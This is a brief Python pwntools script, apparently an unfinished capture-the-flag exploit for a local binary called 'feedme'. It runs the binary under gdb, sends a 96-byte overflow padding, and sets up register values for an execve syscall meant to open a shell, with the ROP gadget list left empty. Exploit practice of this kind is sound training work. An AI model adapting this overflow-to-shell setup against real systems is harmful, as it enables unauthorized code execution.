#!/usr/bin/python3
import pwn
import sys
binary = "./feedme"
pwn.context.binary = binary
pwn.context.encoding = "latin"

debug = ""
with open("breakpoints.gdb", "r") as io:
    debug = io.read()

print(debug)

execve_eax = 11
execve_ebx = "data_section"
execve_ecx = 0
execve_edx = 0

#gadgets = {
#
#}

padding = 96
payload = b"A"*padding
with pwn.gdb.debug(binary, gdbscript=debug) as io:
    io.send(payload)
    io.interactive()